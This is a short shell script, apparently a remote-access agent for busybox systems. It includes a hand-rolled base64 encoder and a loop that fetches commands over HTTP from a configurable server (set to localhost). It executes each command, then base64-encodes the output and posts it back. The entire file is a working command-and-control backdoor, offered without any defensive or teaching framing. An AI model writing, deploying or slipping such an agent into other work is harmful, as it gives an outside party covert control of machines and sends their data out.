#!/bin/sh
SERVER_IP="localhost"
PROTOCOL="http://"
PORT="80"

#!/bin/sh

# fallback base64 implementation
# works with busybox

encode(){

    hexdump -v -e '2/1 "%02x"' | \
        sed -e 's/0/0000 /g;s/1/0001 /g;s/2/0010 /g;s/3/0011 /g;
                s/4/0100 /g;s/5/0101 /g;s/6/0110 /g;s/7/0111 /g;
                s/8/1000 /g;s/9/1001 /g;s/a/1010 /g;s/b/1011 /g;
                s/c/1100 /g;s/d/1101 /g;s/e/1110 /g;s/f/1111 /g;' | \
        tr -d ' ' | \
        sed -e 's/[01]\{6\}/\0 /g' | \
        sed -e 's_000000_A_g; s_000001_B_g; s_000010_C_g; s_000011_D_g;
                s_000100_E_g; s_000101_F_g; s_000110_G_g; s_000111_H_g;
                s_001000_I_g; s_001001_J_g; s_001010_K_g; s_001011_L_g;
                s_001100_M_g; s_001101_N_g; s_001110_O_g; s_001111_P_g;
                s_010000_Q_g; s_010001_R_g; s_010010_S_g; s_010011_T_g;
                s_010100_U_g; s_010101_V_g; s_010110_W_g; s_010111_X_g;
                s_011000_Y_g; s_011001_Z_g; s_011010_a_g; s_011011_b_g;
                s_011100_c_g; s_011101_d_g; s_011110_e_g; s_011111_f_g;
                s_100000_g_g; s_100001_h_g; s_100010_i_g; s_100011_j_g;
                s_100100_k_g; s_100101_l_g; s_100110_m_g; s_100111_n_g;
                s_101000_o_g; s_101001_p_g; s_101010_q_g; s_101011_r_g;
                s_101100_s_g; s_101101_t_g; s_101110_u_g; s_101111_v_g;
                s_110000_w_g; s_110001_x_g; s_110010_y_g; s_110011_z_g;
                s_110100_0_g; s_110101_1_g; s_110110_2_g; s_110111_3_g;
                s_111000_4_g; s_111001_5_g; s_111010_6_g; s_111011_7_g;
                s_111100_8_g; s_111101_9_g; s_111110_+_g; s_111111_/_g;

                s_0000_A=_g;  s_0001_E=_g;  s_0010_I=_g;  s_0011_M=_g;
                s_0100_Q=_g;  s_0101_U=_g;  s_0110_Y=_g;  s_0111_c=_g;
                s_1000_g=_g;  s_1001_k=_g;  s_1010_o=_g;  s_1011_s=_g;
                s_1100_w=_g;  s_1101_0=_g;  s_1110_4=_g;  s_1111_8=_g;

                s_00_A==_;    s_01_Q==_;    s_10_g==_;    s_11_w==_;
                ' | \
                tr -d ' ' | \
                sed -e 's/.\{64\}/\0\n/g'
        echo
}

RUNNING=1
while [ $RUNNING -gt 0 ]; do
    CMD=$(wget -q "${PROTOCOL}${SERVER_IP}:${PORT}/cmd" -O- --output-file=/dev/null 2>/dev/null)
    if [ "${CMD}" != "" ]; then
        if [ "${CMD}" = "exit" ]; then
            RUNNING=0
        else
            sleep 0.125
            echo "===Command==="
            echo "${CMD}"
            RES=$("${CMD}")
            echo "===Result==="
            echo "${RES}"
            echo "===Encoded==="
            RES_ENCODED=$(echo "${RES}" | encode)
            echo "${RES_ENCODED}"

            CMD=$(wget -q "${PROTOCOL}${SERVER_IP}:${PORT}/res" -O- --post-data="${RES_ENCODED}" --output-file=/dev/null 2>/dev/null)

        fi
    fi
done
